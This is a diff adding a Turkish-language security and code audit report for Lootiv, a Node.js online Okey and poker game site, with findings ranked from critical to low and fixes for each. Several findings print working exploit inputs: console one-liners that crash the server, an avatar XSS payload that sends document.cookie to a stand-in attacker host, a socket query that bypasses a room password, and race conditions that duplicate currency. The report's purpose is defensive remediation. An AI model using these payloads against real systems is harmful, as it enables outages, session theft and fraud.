@@ -1,0 +1,644 @@
+===============================================================================
+                    LOOTIV - KOD DENETIM RAPORU (AUDIT)
+===============================================================================
+Tarih         : 11.08.2026
+Kapsam        : server.js, lib/ (oyun motorlari + db), public/js (istemci),
+                views/ (EJS sablonlari), schema.sql, konfigurasyon dosyalari
+Yontem        : Statik kod analizi (node_modules kurulu olmadigi icin uygulama
+                calistirilmadi; tum bulgular satir satir kod okumasiyla teyit
+                edilmistir)
+Not           : Botlar test surumu ozelligi oldugu icin, yalnizca botlardan
+                kaynaklanan bulgular bu rapordan cikarilmistir.
+
+TOPLAM BULGU  : 7 Kritik | 16 Yuksek | 24 Orta | 7 Dusuk
+
+
+===============================================================================
+  KRITIK  -  Acil mudahale (tam kesinti veya dogrudan para kaybi)
+===============================================================================
+
+-------------------------------------------------------------------------------
+[K-1] Tek satirlik mesajla tum sunucu cokuyor - "tableId" tanimsiz
+-------------------------------------------------------------------------------
+Konum : server.js:2260
+
+    io.to(`okey101_${tableId}`).emit('okey101:jokerStolen', {...});
+
+"tableId" degiskeni hicbir yerde tanimli degil -> ReferenceError. Bu kod
+senkron bir socket handler'i icinde oldugu icin hata server.js:14'teki
+uncaughtException yakalayicisina duser ve process.exit(1) ile SUNUCU KAPANIR.
+
+Istismar: Giris yapmis herhangi bir kullanici tarayici konsolundan
+    socket.emit('okey101:process', {tileId:'x', meldId:1, targetJokerId:'joker-1'})
+yazarak tum siteyi dusurebilir.
+
+Ek etki: gracefulShutdown calismadigi icin masalardaki tum LT buharlasir.
+
+Duzeltme: io.to(reqRoomId || 'okey101') kullanin.
+
+
+-------------------------------------------------------------------------------
+[K-2] Ikinci cokertme vektoru - swapJoker'da payload kontrolu yok
+-------------------------------------------------------------------------------
+Konum : server.js:2272-2275
+
+    socket.on('okey101:swapJoker', (payload) => {
+      const res = currentTable101.handleSwapJoker(user.id, payload.meldId, payload.tileId);
+
+Diger tum handler'larda "payload && payload.x" korumasi varken burada yok.
+socket.emit('okey101:swapJoker') (argumansiz) -> TypeError -> sunucu kapanir.
+
+Duzeltme: payload null kontrolu ekleyin; ayrica tum socket handler'larini
+try/catch ile sarmalayin.
+
+
+-------------------------------------------------------------------------------
+[K-3] Ucuncu cokertme vektoru - handleDraw metodu TurkPokerTable'da yok
+-------------------------------------------------------------------------------
+Konum : server.js:2093-2096  ->  lib/turkPokerTable.js
+
+server.js "currentTableTurkPoker.handleDraw(...)" cagiriyor, ancak
+TurkPokerTable sinifinda boyle bir metot YOK (kart degisimi
+handleAction(..., 'discard', ...) uzerinden yapiliyor).
+
+Istismar: socket.emit('turkpoker:draw') -> TypeError -> sunucu kapanir.
+
+Duzeltme: Handler'i kaldirin veya handleAction'a yonlendirin.
+
+
+-------------------------------------------------------------------------------
+[K-4] Kazi Kazan odulu IKI KEZ yatiyor
+-------------------------------------------------------------------------------
+Konum : server.js:348 ve server.js:353  +  lib/db.js:754-760
+
+    await db.adjustLt(req.user.id, prize - config.entry_fee);   // odul 1. kez
+    await db.playScratch(req.user.id, prize);                    // odul 2. kez
+
+playScratch icinde (db.js:757):
+    if (prize > 0) UPDATE users SET lt_balance = lt_balance + prize
+
+Her kazanan oyuncu odulun IKI KATINI aliyor. Ayrica ekrana donen newBalance
+tek odule gore hesaplandigi icin gercek bakiyeyle tutmuyor.
+
+Ek sorun: Gunluk limit kontrolu (count >= daily_limit) ile INSERT arasinda
+kilit/transaction yok -> es zamanli isteklerle gunluk limit tamamen asilabilir.
+
+Duzeltme: Odulu tek yerde yatirin (playScratch icindeki UPDATE'i kaldirin) ve
+tum islemi tek transaction icine alin (SELECT ... FOR UPDATE ile).
+
+
+-------------------------------------------------------------------------------
+[K-5] adjustLt negatif bakiyeyi kirpiyor -> borc siliniyor, LT uretiliyor
+-------------------------------------------------------------------------------
+Konum : lib/db.js:506
+
+    UPDATE users SET lt_balance = GREATEST(lt_balance + $1, 0) WHERE id = $2
+
+Okey ve 101 Okey'de ceza tahsilati bu fonksiyonla yapiliyor ve HICBIR ESCROW
+(pesin tahsilat) yok.
+
+Senaryo: 5 LT'si olan oyuncu 160 LT kaybederse yalnizca 5 LT oder, kazanan
+yine 160 LT alir. Aradaki 155 LT sistemden yaratilir. Ekonomideki enflasyonun
+ana kaynagi budur.
+
+Duzeltme: Oyuncu masaya otururken maksimum kayip tutarini pesin bloke edin
+(escrow) veya odemeyi "WHERE lt_balance >= $1" kosullu UPDATE ile yapip
+yetersizse eli/oyunu iptal edin. GREATEST(...,0) kirpmasini kaldirin.
+
+
+-------------------------------------------------------------------------------
+[K-6] Depolanmis XSS - avatar URL'i uzerinden tum kullanicilar etkileniyor
+-------------------------------------------------------------------------------
+Konum : server.js:533 (dogrulama)  +  public/js/lobby.js:46 (render)
+
+Dogrulama:
+    const isHttp = /^https?:\/\/.+/i.test(raw);    // cift tirnak serbest!
+
+Render:
+    '<img src="' + escapeHtml(p.avatar) + '" ... />'
+
+escapeHtml fonksiyonu (textContent -> innerHTML) &, < ve > karakterlerini
+kacirir ancak CIFT TIRNAGI KACIRMAZ.
+
+Istismar: Avatar olarak
+    https://x" onerror="fetch('//saldirgan/'+document.cookie)
+kaydeden bir kullanici, ana sayfadaki aktif oyuncu listesini goren HERKESIN
+tarayicisinda kod calistirir (oturum cerezi calma, admin hesabi ele gecirme).
+
+Ayni desen public/js/turkpoker.js:586'da hicbir kacis olmadan tekrarlaniyor.
+
+Duzeltme:
+  1) Sunucuda new URL() ile sema + host dogrulamasi yapin.
+  2) Attribute icine yazarken " karakterini &quot; olarak kacirin (veya
+     img.src = value seklinde DOM API ile atayin).
+  3) CSP basligi ekleyin (helmet).
+
+
+-------------------------------------------------------------------------------
+[K-7] Ozel oda sifresi socket uzerinden tamamen atlaniyor
+-------------------------------------------------------------------------------
+Konum : server.js:1963 (socket connection)  vs  server.js:890 (requireRoomAccess)
+
+requireRoomAccess yalnizca HTTP sayfa istegini koruyor. Socket baglantisinda:
+
+    if (reqRoomId && activeUserRooms.has(reqRoomId)) socket.join(reqRoomId);
+
+Burada "privacy" veya "session.unlockedRooms" HIC KONTROL EDILMIYOR.
+
+Istismar:
+    io({query:{game:'okey101', roomId:'room_okey101_3'}})
+ile sifreli odaya girilip koltuga oturulabiliyor.
+
+Ek sorunlar:
+  - Oda sifresi bellekte duz metin tutuluyor.
+  - Karsilastirma "!==" ile yapiliyor (sabit zamanli degil).
+  - privacy alani istemciden serbestce geliyor; 'private' disinda bir deger
+    gonderilirse oda public muamelesi goruyor.
+
+Duzeltme: Socket join'inden once oda gizliligini ve session.unlockedRooms
+kaydini kontrol edin.
+
+
+===============================================================================
+  YUKSEK  -  Guvenlik / kalici veri bozulmasi / kirik ozellik
+===============================================================================
+
+-------------------------------------------------------------------------------
+[Y-1] Oturum sirri kodda gomulu
+-------------------------------------------------------------------------------
+Konum : server.js:71
+
+    secret: process.env.SESSION_SECRET || 'lootiv-gizli-anahtar-degistir'
+
+.env dosyasi yoksa veya yuklenmezse sunucu SESSIZCE bu sabit anahtarla calisir.
+Kaynak koda erisen herkes gecerli admin oturum cerezi imzalayabilir.
+
+Duzeltme: Fallback'i kaldirin; degisken yoksa acilista process.exit(1) yapin.
+
+
+-------------------------------------------------------------------------------
+[Y-2] Oturumlar bellekte (MemoryStore) tutuluyor
+-------------------------------------------------------------------------------
+Konum : server.js:70-76
+
+express-session'a store verilmemis -> varsayilan bellek deposu kullaniliyor.
+  - Her yeniden baslatmada tum kullanicilar oturumdan duser.
+  - Bellek surekli buyur (temizlenmez).
+  - Birden fazla process/worker ile calismaz.
+
+Duzeltme: connect-pg-simple kullanin (pg zaten bagimlilikta mevcut).
+
+
+-------------------------------------------------------------------------------
+[Y-3] CSRF korumasi hic yok
+-------------------------------------------------------------------------------
+Konum : Tum POST rotalari
+
+Hicbir formda CSRF token'i yok, cookie'de sameSite ayarlanmamis. Ozellikle
+riskli rotalar:
+    /admin/users/:id/lt        (bakiye degistirme)
+    /admin/users/:id/ban       (yasaklama)
+    /admin/users/:id/admin     (yetki verme)
+    /admin/treasury/transfer   (hazineden para cikisi)
+
+Modern tarayicilarin Lax varsayilani kismi koruma saglar, ancak bu bir tasarim
+karari degil tesadufi bir korumadir.
+
+Duzeltme: csrf-csrf / csurf benzeri middleware + cookie'ye sameSite:'strict'.
+
+
+-------------------------------------------------------------------------------
+[Y-4] Giris guvenligi: brute-force, session fixation, event loop blokaji
+-------------------------------------------------------------------------------
+Konum : server.js:170-194
+
+  a) Brute-force korumasi, rate limit ve CAPTCHA yok.
+  b) Basarili giriste req.session.regenerate() cagrilmiyor -> SESSION FIXATION
+     (saldirgan onceden bildigi bir session id ile kurbanin oturumunu ele
+     gecirebilir).
+  c) bcrypt.compareSync senkron -> her giris denemesi event loop'u ~100 ms
+     bloke ediyor. Es zamanli 50 istek fiilen DoS yaratir.
+
+Duzeltme: express-rate-limit, session.regenerate(), bcrypt.compare (async).
+
+
+-------------------------------------------------------------------------------
+[Y-5] Hediye ozelligi tamamen bozuk - var olmayan db fonksiyonlari
+-------------------------------------------------------------------------------
+Konum : server.js:1924-1937 (handleGift)
+
+    const fromUsers = await db.getUsersByIds([fromUserId]);   // TANIMSIZ
+    await db.updateUserBalance(-amount, fromUserId);          // TANIMSIZ
+    await db.updateUserBalance(amount, toUserId);             // TANIMSIZ
+
+Bu uc fonksiyonun hicbiri lib/db.js icinde tanimli degil. Sonuc: her hediye
+gonderimi "Hediye gonderilirken bir hata olustu." hatasiyla basarisiz oluyor
+(4 oyunun tamaminda).
+
+Ek sorun: daily_gifts tablosu ve getDailyGiftTotal fonksiyonu yazilmis ama
+HIC KULLANILMIYOR. Duzeltme yapilsa bile GUNLUK HEDIYE LIMITI OLMAYACAK ->
+hesaplar arasi sinirsiz LT transferi (coklu hesap ile ekonomi manipulasyonu).
+
+Duzeltme: Eksik fonksiyonlari getUserById/adjustLt ile degistirin, transferi
+tek transaction'a alin ve getDailyGiftTotal ile gunluk limit uygulayin.
+
+
+-------------------------------------------------------------------------------
+[Y-6] Admin gorev silme islemi 500 hatasi veriyor
+-------------------------------------------------------------------------------
+Konum : lib/db.js:796 (tanim)  vs  lib/db.js:1697-1702 (exports)
+
+deleteDailyTask fonksiyonu tanimli, ancak module.exports listesinde YOK.
+server.js:1318'de "action_type=delete" secildiginde
+"db.deleteDailyTask is not a function" -> 500.
+
+Duzeltme: exports listesine ekleyin.
+
+
+-------------------------------------------------------------------------------
+[Y-7] Turk Pokeri: deste tukenince sunucu cokuyor
+-------------------------------------------------------------------------------
+Konum : lib/turkPokerTable.js:376  +  lib/turkPokerHand.js:119-121
+
+4 kisilik masada 32 kartin 20'si dagitiliyor, 12 kart kaliyor.
+4 oyuncu x 4 kart degisimi = 16 > 12.
+
+    while (seat.cards.length < 5 && this.deck.length > 0) { ... }
+
+Deste bitince oyuncu 5'ten az kartla kaliyor, ardindan showdown'da:
+
+    if (cards.length !== 5) throw new Error('evaluateBest requires exactly 5 cards');
+
+Bu senkron cagri zincirinde firlatilan hata -> uncaughtException -> sunucu
+kapanir. (Tamamen gercek oyunculardan olusan masada da olusur.)
+
+Duzeltme: Iskarta yigininin karistirilip desteye geri konmasi veya el basina
+toplam degisim hakkinin deste boyutuna gore sinirlandirilmasi.
+
+
+-------------------------------------------------------------------------------
+[Y-8] Oturma isleminde TOCTOU yarisi -> chip kopyalama
+-------------------------------------------------------------------------------
+Konum : lib/pokerTable.js:95-101  ve  lib/turkPokerTable.js:177-182
+
+    const freshUser = await db.getUserById(user.id);      // okuma
+    if (freshUser.lt_balance < BUY_IN) return {...};       // kontrol
+    await db.adjustLt(user.id, -BUY_IN);                   // yazma
+
+Okuma ile yazma arasinda async bosluk var; ustelik adjustLt bakiyeyi 0'da
+kirpiyor (bkz. K-5).
+
+Istismar: 100 LT'si olan kullanici iki farkli odaya AYNI ANDA oturursa iki
+masada da 100'er chip alir, DB'den yalnizca 100 duser. Masadan kalkinca
+200 LT geri alir. N masa ile N katina cikarilabilir.
+
+Duzeltme: Kosullu tek atomik UPDATE kullanin:
+    UPDATE users SET lt_balance = lt_balance - $1 WHERE id = $2 AND lt_balance >= $1
+
+
+-------------------------------------------------------------------------------
+[Y-9] 101 Okey bakiye kontrolu yanlis kolon adi kullaniyor
+-------------------------------------------------------------------------------
+Konum : lib/okey101Table.js:319
+
+    if (!user || user.lt < STAKE) { ... }
+
+Veritabanindaki kolon adi "lt_balance". "user.lt" her zaman undefined,
+"undefined < 20" her zaman false -> KONTROL HIC CALISMIYOR.
+
+Sonuc: 0 bakiyeli oyuncu oynayabiliyor; K-5 ile birleserek LT uretimine
+yol aciyor.
+
+Duzeltme: user.lt_balance olarak duzeltin.
+
+
+-------------------------------------------------------------------------------
+[Y-10] VIP kodlari tahmin edilebilir sekilde uretiliyor
+-------------------------------------------------------------------------------
+Konum : lib/db.js:567-582
+
+    chars.charAt(Math.floor(Math.random() * chars.length))
+
+Math.random kriptografik olarak guvenli degil. Ayrica /settings/profile/vip
+rotasinda deneme sayisi siniri yok -> kod deneme (brute-force) saldirisi
+mumkun.
+
+Duzeltme: crypto.randomInt kullanin + kod deneme rate limiti ekleyin.
+
+
+-------------------------------------------------------------------------------
+[Y-11] Ucretsiz LT ciftligi: dogrulama bonusu istismari
+-------------------------------------------------------------------------------
+Konum : server.js:411-487, server.js:214-256
+
+  - Dogrulama kodlari demo modunda EKRANDA GOSTERILIYOR (server.js:421, 469).
+  - Telefon numarasinda format/benzersizlik kontrolu yok (server.js:445).
+  - Kayitta rate limit, e-posta dogrulamasi veya CAPTCHA yok.
+
+Sonuc: Her yeni hesap = 500 (baslangic) + 500 (dogrulama bonusu) LT.
+Otomasyonla sinirsiz uretilebilir.
+
+Duzeltme: Canliya cikmadan once demo modu kapatilmali, gercek e-posta/SMS
+gonderimi baglanmali, telefon numarasi benzersiz olmali, kayit rate limitli
+olmali.
+
+
+-------------------------------------------------------------------------------
+[Y-12] Hata middleware sirasi yanlis -> stack trace sizintisi
+-------------------------------------------------------------------------------
+Konum : server.js:1435 (1. handler)  vs  server.js:1789, 1905 (rotalar)
+
+app.use((err, req, res, next)) server.js:1435'te tanimli, ancak
+/api/rooms/create ve /api/rooms/verify-password rotalari ONDAN SONRA
+(server.js:1789 ve 1905) kaydediliyor.
+
+Bu rotalardaki hatalar 1435'i atlayip server.js:2389'a duser, o da next(err)
+cagirir -> Express varsayilan handler'i STACK TRACE'I TARAYICIYA BASAR
+(NODE_ENV=production degilse). Dosya yollari ve kod yapisi sizar.
+
+Duzeltme: Hata middleware'lerini tum rotalarin EN SONUNA tasiyin ve
+NODE_ENV=production ayarlayin.
+
+
+-------------------------------------------------------------------------------
+[Y-13] /api/rooms/create sinirsiz - bellek ve LT sizintisi
+-------------------------------------------------------------------------------
+Konum : server.js:1789-1903  +  server.js:1776 (checkUserRoomCleanup)
+
+  - Rate limit yok.
+  - Her cagri yeni bir Table nesnesi + zamanlayicilar yaratiyor.
+  - Kurucuyu 0. koltuga oturtuyor (poker icin 100 LT kesiyor).
+  - Oda temizligi YALNIZCA bir socket disconnect oldugunda calisiyor.
+    Socket hic baglanmazsa oda ve icindeki kilitli LT sonsuza kadar kalir.
+
+Istismar: Dongude cagirarak sunucu bellegi tuketilebilir; ayrica her cagri
+kullanicinin 100 LT'sini geri donusu olmayan sekilde kilitler.
+
+Duzeltme: Rate limit + kullanici basina acik oda limiti + zaman asimli
+(TTL) oda temizligi.
+
+
+-------------------------------------------------------------------------------
+[Y-14] Kapanista yalnizca Texas masasi iade ediliyor
+-------------------------------------------------------------------------------
+Konum : server.js:2378-2387
+
+    for (const seat of table.seats) { ... }
+
+refundSeatedPlayers sadece global "table" (Texas Hold'em) uzerinde donuyor.
+turkPokerTable ve TUM ozel oda masalarindaki chipler iade edilmeden kayboluyor.
+
+Duzeltme: Tum aktif masalar (global + activeUserRooms) uzerinde donun.
+
+
+-------------------------------------------------------------------------------
+[Y-15] Oyun ortasinda oda silinince pot kayboluyor
+-------------------------------------------------------------------------------
+Konum : server.js:1776-1787  +  lib/okey101Table.js:137-176
+
+checkUserRoomCleanup, insan oyuncu kalmayinca room.table.resetTable() cagiriyor.
+101 Okey'de resetTable "this.pot = 0" yapiyor ama KIMSEYE IADE ETMIYOR.
+
+Senaryo: Tum insan oyuncular baglantiyi kaybederse el basina toplanan tum
+stake yok olur.
+
+Duzeltme: resetTable oncesi potu katilimcilara oranli iade edin.
+
+
+-------------------------------------------------------------------------------
+[Y-16] Sohbet: mute kontrolu yok, hiz siniri yok
+-------------------------------------------------------------------------------
+Konum : server.js:2326-2343
+
+  - user.is_muted kontrolu yok (README'de de belirtilmis) -> susturulan
+    kullanici sohbete yazmaya devam ediyor.
+  - Rate limit yok; her mesaj bir DB INSERT'i -> flood ile veritabani
+    doldurulabilir ve tum kullanicilara yayin yapilir.
+
+Duzeltme: is_muted kontrolu + socket basina mesaj/saniye limiti.
+
+
+===============================================================================
+  ORTA  -  Islevsel bozukluklar, performans ve teknik borc
+===============================================================================
+
+[O-1]  /api/turkpoker-leaderboard ROTASI HIC YOK
+       public/js/turkpoker.js:575 bu adrese fetch atiyor; server.js'te boyle
+       bir rota tanimli degil -> liderlik tablosu her zaman "Hata olustu".
+       Ayrica db.updatePokerStats HICBIR YERDEN CAGRILMIYOR -> user_stats
+       tablosu her zaman bos kalir. Ozellik butunuyle olu durumda.
+
+[O-2]  game-over payload uyusmazligi
+       lib/okey101Table.js:1021 -> emit('game-over', {handNumber, totalPot, results})
+       public/js/okey101.js:226  -> data.totalScores okuyor
+       Sonuc: Oyun sonu ekrani BOS liste gosteriyor.
+
+[O-3]  Global 101 Okey masasinda game-over dinleyicisi yok
+       server.js:1699-1740'ta okey101Table icin log/update/private-tiles/
+       hand-result kaydedilmis ama 'game-over' YOK. (Yalnizca ozel odalarda
+       server.js:1857'de var.) Normal masada oyun bitince istemci hicbir sey
+       almiyor.
+
+[O-4]  isKatlamali her el basinda TRUE'ya eziliyor
+       server.js:1819 oda kurulurken set ediyor, ancak
+       lib/okey101Table.js:282 "this.isKatlamali = true;" ile her el basinda
+       uzerine yaziyor -> "Katlamasiz" oda secenegi hic calismiyor.
+
+[O-5]  Oda bahis (stake) ayari poker motorlarinda kullanilmiyor
+       server.js:1814 "tableInstance.stake = stake" atiyor, ancak PokerTable
+       sabit BUY_IN=100, TurkPokerTable ise this.buyIn kullaniyor. Kullanici
+       hangi bahsi secerse secsin masa hep 100 LT.
+
+[O-6]  "Esli" (takim) mod uygulanmamis
+       GAME_META'da secenek var, tableInstance.gameMode etiketi set ediliyor,
+       ancak motorlarda takim/es puanlama mantigi hic yok. Sadece gorsel etiket.
+
+[O-7]  /lobiler linki 404
+       public/js/okey101.js:247 ve 295 -> window.location.href='/lobiler'
+       Boyle bir rota yok. Dogrusu: /oyun/okey101
+
+[O-8]  state.tableId her zaman undefined
+       lib/okey101Table.js:1164 "tableId: this.id" -> sinifta "id" alani yok.
+       public/js/okey101.js:310-311 arayuzde "#undefined" gosteriyor.
+
+[O-9]  lib/db.js'te 5 FONKSIYON IKI KEZ TANIMLI
+       logWhitelistEvent   (satir 619 ve 1411)
+       getWhitelistStats   (satir 626 ve 1430)
+       getWhitelistLogs    (satir 652 ve 1464)
+       deleteWhitelistLog  (satir 660 ve 1479)
+       clearAllWhitelistLogs (satir 664 ve 1488)
+       JavaScript'te ikinci tanim kazanir. Ikinci getWhitelistStats
+       "total_users" yerine "unique_users" donduruyor; views/admin.ejs:1751
+       ise "_wlStats.summary.total_users" okuyor -> admin panelindeki "Uye"
+       istatistigi HER ZAMAN BOS.
+
+[O-10] GET /kazikazan rotasi IKI KEZ tanimli
+       server.js:259 (birinci - scratchConfig veriyor, bu calisir)
+       server.js:299 (ikinci - config/count/limitReached veriyor, OLU KOD)
+       Kafa karistirici; ikinci blok silinmelidir.
+
+[O-11] Istemcinin gonderdigi ama sunucuda karsiligi olmayan 6 event
+       public/js/okey101.js icinde:
+         okey101:leave_table    (satir 1188, 1199)
+         okey101:join_random    (satir 1200)
+         okey101:send_like      (satir 1242)
+         okey101:request_sync   (satir 1250)
+         okey101:request_freeze (satir 1259)
+         okey101:chat_message   (satir 1295)
+       Bu butonlarin hicbiri calismiyor, sessizce hicbir sey yapmiyor.
+
+[O-12] Ozel oda loglari GLOBAL kanala yayinlaniyor
+       server.js:1841 -> gameLogMessage(text, 'oyun', game)
+       Oda logu roomId yerine oyun kanalina gidiyor -> baska masalardaki
+       hamleler, gosterge bilgisi ve el sonuclari tum oyunculara sizar.
+
+[O-13] Her socket baglantisinda 11 ayri DB sorgusu
+       server.js:1987 -> CHANNELS dizisi 11 kanal, her biri icin 50 mesaj
+       cekiliyor. 100 es zamanli baglanti = 1100 sorgu. Olceklenmez.
+
+[O-14] attachUser her HTTP isteginde 4+ sorgu calistiriyor
+       server.js:86-105 -> syncVip + getUserById + getUnreadAnnouncementCount
+       + getPendingFriendRequestCount. Statik olmayan her sayfa istegi icin.
+
+[O-15] /api/whitelist/event kimlik dogrulamasiz ve sinirsiz
+       server.js:1084 -> attachUser var ama requireAuth YOK, rate limit yok,
+       "feature" degeri istemciden serbestce geliyor (beyaz liste yok).
+       Anonim kullanici tabloyu sinirsiz sisirebilir.
+
+[O-16] Cookie guvenlik bayraklari eksik
+       server.js:74 -> cookie: { maxAge: ... } sadece.
+       secure yok, sameSite yok, app.set('trust proxy') yok.
+       HTTPS arkasinda calisirken cookie duz HTTP uzerinden de gonderilir.
+
+[O-17] KURAL SAPMASI: Sahte okey gosterge yerine okey degerine donusuyor
+       lib/okey101Logic.js:17-23 (getEffectiveTile)
+       Sahte okey (joker) taslari okeySpec (gosterge+1) degerine buruntuluyor.
+       Standart Turk Okeyi kuralinda sahte okey GOSTERGE TASININ KENDISINI
+       temsil eder. Bu, gecerli/gecersiz per ve seri hesaplarini degistirir.
+
+[O-18] "Gecersiz grup" cezasi her denemede tekrar +101 yaziyor
+       lib/okey101Table.js:454 ve 481
+       penalizedOpenThisTurn korumasi yalnizca "yetersiz sayi" dalinda var
+       (satir 463, 488). Gecersiz grup denemesinde koruma yok -> tek bir
+       hatali surukle-birak defalarca cezalandirilabiliyor.
+
+[O-19] schema.sql 16 TABLO EKSIK
+       Mevcut: users, admin_yetkileri, game_logs, daily_question,
+               daily_question_answers, scratch_config, scratch_plays,
+               daily_tasks, user_daily_tasks
+       Eksik : messages, blogs, announcements, friendships, market_listings,
+               item_catalog, user_inventory, market_config, vip_codes,
+               vip_links, whitelist_events, user_stats, daily_gifts,
+               commission_settings, site_commission, commission_withdrawals
+       Referans sema olarak guvenilmez durumda.
+
+[O-20] Anti-collusion (ayni IP) kontrolu hic calismiyor
+       lib/turkPokerTable.js:162-175 -> sit(user, seatIndex, clientIp)
+       server.js:2076 -> sit(user, seatIndex)   // clientIp HIC GECIRILMIYOR
+       clientIp her zaman null -> IP kontrolu atlanir. Olu kod, koruma yok.
+       Ayni kisi iki hesapla ayni masaya oturabilir.
+
+[O-21] Zaman asiminda bos el -> cokme riski
+       lib/okeyTable.js:525-528  ve  lib/okey101Table.js:1154-1158
+           const tile = pool[Math.floor(Math.random() * pool.length)];
+           this.handleDiscard(seat.userId, tile.id);
+       pool bos ise tile undefined -> "tile.id" TypeError -> setTimeout
+       icinde oldugu icin uncaughtException -> sunucu kapanir.
+       Duzeltme: pool.length === 0 kontrolu ekleyin.
+
+[O-22] distributePot() olu kod
+       lib/okey101Table.js:870-921 (50 satir) hicbir yerden cagrilmiyor.
+       El bazli pot dagitimi aslinda yapilmiyor; tum dagitim endGame'de
+       toplu yapiliyor. Kafa karistirici, silinmeli veya baglanmali.
+
+[O-23] Self-XSS ve tirnak kacisi eksikligi
+       public/js/okey101.js:1302 -> msgEl.innerHTML = `<b>Sen:</b> ${text}`
+         Kullanicinin kendi mesaji kacirilmadan basiliyor (self-XSS).
+       public/js/lobby.js:53 -> onclick="openPmModal('...escapeHtml(rumuz)...')"
+         escapeHtml tek tirnagi kacirmiyor. Su an rumuz regex'i
+         (^[a-zA-Z0-9_]{3,20}$) koruyor, ancak regex gevsetilirse acik olur.
+
+[O-24] Yarim ozellikler hala erisilebilir
+       /pazar ve /envanter "yapim asamasinda"ya yonlendiriliyor
+       (server.js:745, 800), ancak su rotalar hala CANLI ve calisiyor:
+           POST /pazar/ilan          GET  /pazar/ilan
+           POST /pazar/sat/:invId    GET  /pazar/sat/:invId
+           POST /pazar/:id/satinal   POST /pazar/:id/iptal
+           POST /envanter/upgrade/:invId
+       Kullanici ilan olusturabiliyor ama sonra /pazar'a yonlendirilip ana
+       sayfaya atiliyor. Ayrica /envanter/upgrade sinirsiz +1 basiyor
+       (maliyet yok, seviye siniri yok) -> lib/db.js:1148-1156.
+
+[O-25] 3 MB body limiti + avatar data-URL'lerinin TEXT kolonunda saklanmasi
+       server.js:66-67 -> urlencoded ve json limitleri 3mb.
+       server.js:535 -> 2 MB'a kadar data:image kabul ediliyor ve
+       users.avatar_url (TEXT) icinde saklaniyor.
+       Bu avatar, aktif kullanici listesiyle birlikte TUM oyunculara
+       socket uzerinden gonderiliyor (server.js:1487) -> her yayinda
+       megabaytlarca trafik.
+
+
+===============================================================================
+  DUSUK  -  Kod hijyeni ve iyilestirmeler
+===============================================================================
+
+[D-1]  views/lobby.ejs.bak yedek dosyasi repoda duruyor - silinmeli.
+
+[D-2]  LOOTIVDEBUG/ altinda test dosyalari var
+       (okey_finish_test.js, okey_integration_test.js) ancak package.json'da
+       "test" script'i yok; bu testler hic calistirilmiyor.
+
+[D-3]  Produksiyonda kalan console.log cagrilari
+       server.js (4 adet), public/js/okey101.js (2 adet), public/js/okey.js (1)
+
+[D-4]  helmet paketi yok -> guvenlik basliklari hic gonderilmiyor
+       (CSP, X-Frame-Options, X-Content-Type-Options, HSTS).
+       CSP olsaydi K-6'daki XSS'in etkisi buyuk olcude sinirlanirdi.
+
+[D-5]  Istaka boyutunda uc farkli deger
+       public/js/okey101.js:69 -> new Array(40), yorumda "2 rows of 17"
+       satir aralari mantiginda 0-19 / 20-39 kullaniliyor
+       README.md -> "2 sira x 13 slot"
+       Tutarsiz; tek bir sabitte toplanmali.
+
+[D-6]  GAME_META "2-5 kisi" diyor ancak TurkPokerTable.seatsCount = 4
+       (lib/turkPokerTable.js:8). Aciklama metni yanlis bilgi veriyor.
+
+[D-7]  Hicbir tabloda ikincil indeks yok
+       Onerilen: messages(channel, id DESC), game_logs(user_id),
+       game_logs(created_at DESC), scratch_plays(user_id, play_date),
+       whitelist_events(created_at DESC), market_listings(status, created_at)
+
+
+===============================================================================
+  ONERILEN DUZELTME SIRASI
+===============================================================================
+
+ADIM 1 - BUGUN (yaklasik 15 dakika, tam kesintiyi engeller)
+    K-1, K-2, K-3   -> 3 cokme vektoru, toplam ~10 satirlik degisiklik
+
+ADIM 2 - BU HAFTA (ekonomi butunlugu)
+    K-4  Kazi kazan cift odeme
+    K-5  adjustLt kirpmasi / escrow eksikligi
+    Y-9  yanlis kolon adi
+    Y-8  oturma yarisi (TOCTOU)
+    Not: Bu maddeler acikken LT bakiyelerine guvenilemez; duzeltmeden once
+         mevcut bakiyelerin denetlenmesi/sifirlanmasi dusunulmelidir.
+
+ADIM 3 - CANLIYA CIKMADAN ONCE (guvenlik)
+    K-6  Avatar XSS
+    K-7  Ozel oda sifre bypass
+    Y-1  SESSION_SECRET
+    Y-2  MemoryStore -> connect-pg-simple
+    Y-3  CSRF
+    Y-4  Giris guvenligi
+    Y-11 Dogrulama bonusu istismari
+    Y-12 Stack trace sizintisi
+    D-4  helmet
+
+ADIM 4 - SONRASINDA
+    Kalan Yuksek maddeler, ardindan Orta ve Dusuk liste.
+
+===============================================================================
+                              RAPOR SONU
+===============================================================================
